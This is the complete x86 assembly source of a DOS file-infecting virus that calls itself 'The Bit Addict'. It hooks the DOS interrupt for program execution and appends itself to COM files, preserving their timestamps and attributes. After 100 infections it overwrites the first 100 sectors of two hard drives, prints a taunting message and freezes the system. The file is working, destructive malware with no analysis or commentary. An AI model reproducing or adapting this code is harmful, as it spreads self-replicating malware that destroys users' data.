code segment
	org	0

	call	Virus

SavedCode	db	0cdh,020h,11 dup(090h)

Jump		db	0e9h
NearOfset	dw	0

ID		db	'BIT ADDICT'
ExeHead		db	'MZ'

SaveInt21	equ	this word
OldInt21	dd	0
Teller		db	0
Message		db	'The Bit Addict says: ',13,10
		db	'"You have a good taste for hard disks, it was delicious !!!"'
		db	13,10,'$'

NewInt21:
	cmp	ah,4bh
	je	Exec
	jmp	cs:OldInt21
Exec:	cmp	cs:Teller,100
	jb	Infect

	mov	ax,2
	xor	bx,bx
	mov	cx,100
	xor	dx,dx
	int	026h
	mov	ax,3
	xor	bx,bx
	mov	cx,100
	xor	dx,dx
	int	026h

	mov	ax,cs
	mov	ds,ax
	mov	ah,9
	lea	dx,Message
	int	021h

HangUp:	cli
	jmp	HangUp

Infect:	push	ax
	push	bx
	push	cx
	push	dx
	push	si
	push	di
	push	ds
	push	es
	push	dx
	mov	ax,04300h
	int	021h
	push	cx
	mov	ax,04301h
	xor	cx,cx
	int	021h
	mov	ax,03d02h
	int	021h
	jnc	OK1
	jmp	Error
Ok1:	mov	bx,ax
	mov	ax,05700h
	int	021h
	push	cx
	push	dx
	mov	ax,cs
	mov	ds,ax
	mov	es,ax
	mov	ax,03f00h
	mov	cx,13
	lea	dx,SavedCode
	int	021h
	jc	Close
	lea	si,ID
	lea	di,SavedCode[3]
	mov	cx,10
	repe	cmpsb
	je	Close
	lea	si,ExeHead
	lea	di,SavedCode
	mov	cx,2
	repe	cmpsb
	je	Close
Com:	mov	ax,04202h
	xor	cx,cx
	xor	dx,dx
	int	021h
	jc	Close
	or	dx,dx
	jne	Close
	sub	ax,3
	jb	Close
	mov	NearOfset,ax
	mov	ax,04000h
	mov	cx,CodeSize
	xor	dx,dx
	int	021h
	jc	Close
	mov	ax,04200h
	xor	cx,cx
	xor	dx,dx
	int	021h
	jc	Close
	mov	ax,04000h
	mov	cx,13
	lea	dx,Jump
	int	021h
	inc	cs:Teller
Close:	pop	dx
	pop	cx
	mov	ax,05701h
	int	021h
	mov	ax,03e00h
	int	021h
Error:	pop	cx
	pop	dx
	pop	es
	pop	ds
	push	ds
	push	es
	mov	ax,04301h
	int	021h
	pop	es
	pop	ds
	pop	di
	pop	si
	pop	dx
	pop	cx
	pop	bx
	pop	ax
	jmp	cs:OldInt21

Virus:	pop	bx
	sub	bx,3
	xor	ax,ax
	mov	ds,ax
	cmp	w[021h*4+2],0a000h
	jae	Exit
	mov	dx,03bfh
	mov	al,3
	out	dx,al
	mov	ax,cs
	mov	ds,ax
	mov	ax,VirusSegment1
Repeat:	mov	es,ax
	mov	si,bx
	xor	di,di
	mov	cx,CodeSize
	repe	movsb
	mov	si,bx
	xor	di,di
	mov	cx,CodeSize
	repe	cmpsb
	je	Ok2
	mov	ax,VirusSegment2
	mov	dx,es
	cmp	ax,dx
	je	Exit
	jmp	Repeat
Ok2:	xor	ax,ax
	mov	ds,ax
	mov	ax,ds:[84h]
	mov	es:SaveInt21[0],ax
	mov	ax,ds:[86h]
	mov	es:SaveInt21[2],ax
	mov	ax,NewInt21
	mov	[84h],ax
	mov	ax,es
	mov	[86h],ax
Exit:	mov	ax,cs
	mov	ds,ax
	mov	es,ax
	mov	si,bx
	add	si,3
	mov	di,0100h
	mov	cx,13
	rep	movsb
	mov	ax,0100h
	push	ax
	ret

CodeSize	equ	$
VirusSegment1	equ	0c000h-(($+0fh) shr 4)
VirusSegment2	equ	0bc00h-(($+0fh) shr 4)
